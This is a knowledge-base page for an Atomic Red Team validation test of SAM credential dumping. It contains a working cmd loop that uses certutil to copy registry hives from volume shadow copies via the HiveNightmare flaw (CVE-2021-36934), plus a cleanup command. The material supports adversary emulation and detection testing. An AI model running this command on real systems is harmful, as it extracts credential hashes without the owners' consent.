---
atomic_guid: "eeb9751a-d598-42d3-b11c-c122d9c3f6c7"
title: "dump volume shadow copy hives with certutil"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.002"
attack_technique_name: "OS Credential Dumping: Security Account Manager"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "eeb9751a-d598-42d3-b11c-c122d9c3f6c7"
  - "dump volume shadow copy hives with certutil"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# dump volume shadow copy hives with certutil

Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as "HiveNightmare" or "SeriousSAM".
This can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)

## Metadata

- Atomic GUID: eeb9751a-d598-42d3-b11c-c122d9c3f6c7
- Technique: T1003.002: OS Credential Dumping: Security Account Manager
- Platforms: windows
- Executor: command_prompt
- Elevation Required: False
- Source Path: atomics/T1003.002/T1003.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.002]]

## Input Arguments

### limit

- description: Limit to the number of shadow copies to iterate through when trying to copy the hive
- type: integer
- default: 10

### target_hive

- description: Hive you wish to dump
- type: string
- default: SAM

## Executor

- elevation_required: False
- name: command_prompt

### Command

```cmd
for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}" %temp%\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\#{target_hive}vss*
```

### Cleanup

```cmd
for /L %a in (1,1,#{limit}) do @(del %temp%\#{target_hive}vss%a >nul 2>&1)
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml)
